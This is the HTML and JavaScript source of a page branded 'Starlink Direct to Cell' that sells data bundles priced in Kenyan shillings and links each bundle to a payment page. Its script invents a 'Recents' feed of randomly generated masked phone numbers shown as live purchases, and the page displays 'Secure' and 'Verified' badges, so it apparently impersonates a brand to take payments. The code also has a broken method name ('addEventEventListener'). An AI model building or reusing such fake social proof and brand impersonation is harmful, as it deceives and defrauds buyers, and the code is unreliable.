<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <title>Starlink Direct to Cell</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="app-container">
        <!-- Header -->
        <header class="app-header">
            <div class="app-title">Starlink Direct to Cell</div>
            <div class="app-subtitle">Secure coverage • Wide coverage • Direct to cell</div>
        </header>

        <!-- Notification Banner -->
        <div class="notification-banner">
            <i class="fas fa-exclamation-triangle"></i>
            <span>Choose your desired package and complete the payment to get instant data.</span>
        </div>

        <!-- Recents Section -->
        <div class="recents-section">
            <div class="recents-header">Recents</div>
            <div class="recents-list" id="recentsList">
                <!-- Recents will be dynamically inserted here -->
            </div>
        </div>

        <!-- Select Package Section -->
        <div class="select-package-section">
            <div class="section-header">
                <i class="fas fa-box-open"></i>
                <span>Select Your Package</span>
            </div>

            <!-- Packages Grid -->
            <div class="packages-grid" id="packagesGrid">
                <!-- Packages will be dynamically inserted here -->
            </div>
        </div>

        <!-- CTA Button -->
        <div class="cta-button">
            <a id="proceedButton" href="#" class="cta-btn">
                <i class="fas fa-bolt"></i>
                <span id="proceedButtonText">Get 12.5GB (48 hrs) NOW</span>
            </a>
        </div>

        <!-- Footer -->
        <footer class="app-footer">
            <div class="footer-item">
                <i class="fas fa-lock"></i>
                <span>Secure</span>
            </div>
            <div class="footer-item">
                <i class="fas fa-bolt"></i>
                <span>Instant</span>
            </div>
            <div class="footer-item">
                <i class="fas fa-check-circle"></i>
                <span>Verified</span>
            </div>
        </footer>
    </div>

    <script>
        // Define packages data
        const packages = [
            { name: "5GB", price: 49, data: "5GB", duration: "24 hrs" },
            { name: "7.5GB", price: 80, data: "7.5GB", duration: "24 hrs" },
            { name: "10GB", price: 120, data: "10GB", duration: "48 hrs" },
            { name: "12.5GB", price: 140, data: "12.5GB", duration: "48 hrs" },
            { name: "16GB", price: 180, data: "16GB", duration: "7 days" },
            { name: "21GB", price: 200, data: "21GB", duration: "7 days" },
            { name: "25.5GB", price: 220, data: "25.5GB", duration: "7 days" },
            { name: "30GB", price: 350, data: "30GB", duration: "7 days" },
            { name: "35GB", price: 420, data: "35GB", duration: "14 days" },
            { name: "40GB", price: 540, data: "40GB", duration: "14 days" },
            { name: "45GB", price: 680, data: "45GB", duration: "30 days" },
            { name: "50GB", price: 960, data: "50GB", duration: "30 days" },
            { name: "60GB", price: 1550, data: "60GB", duration: "30 days" },
            { name: "70GB", price: 2000, data: "70GB", duration: "30 days" }
        ];

        // Generate random phone numbers for Recents section
        function generateRandomPhoneNumbers() {
            const phoneNumbers = [];
            for (let i = 0; i < 7; i++) {
                const randomNumber = `07${Math.floor(10000000 + Math.random() * 90000000)}`;
                phoneNumbers.push(randomNumber);
            }
            return phoneNumbers;
        }

        // Display Recents after 3 seconds
        setTimeout(() => {
            const phoneNumbers = generateRandomPhoneNumbers();
            const recentsList = document.getElementById('recentsList');
            phoneNumbers.forEach(number => {
                const maskedNumber = `${number.substring(0, 4)}****${number.substring(8, 10)}`;
                const randomData = `${Math.floor(Math.random() * 50) + 5}GB`;
                const recentsItem = document.createElement('div');
                recentsItem.className = 'recents-item';
                recentsItem.innerHTML = `
                    <div class="recents-text">${maskedNumber} increased to ${randomData} — just now</div>
                    <div class="recents-progress">
                        <div class="progress-bar" style="width: ${Math.floor(Math.random() * 70) + 30}%"></div>
                    </div>
                `;
                recentsList.appendChild(recentsItem);
            });
        }, 3000);

        // Dynamically generate package cards
        const packagesGrid = document.getElementById('packagesGrid');
        packages.forEach(pkg => {
            const packageCard = document.createElement('a');
            packageCard.href = `payment.html?package=${pkg.name}&price=${pkg.price}&data=${pkg.data}&duration=${pkg.duration}`;
            packageCard.className = 'package-card';
            packageCard.innerHTML = `
                <div class="package-name">${pkg.name}</div>
                <div class="package-details">Fee: Ksh ${pkg.price} • ${pkg.duration}</div>
            `;
            packageCard.addEventEventListener('click', (e) => {
                e.preventDefault();
                document.getElementById('proceedButton').href = packageCard.href;
                document.getElementById('proceedButtonText').textContent = `Get ${pkg.data} (${pkg.duration}) NOW`;
            });
            packagesGrid.appendChild(packageCard);
        });
    </script>
</body>
</html>
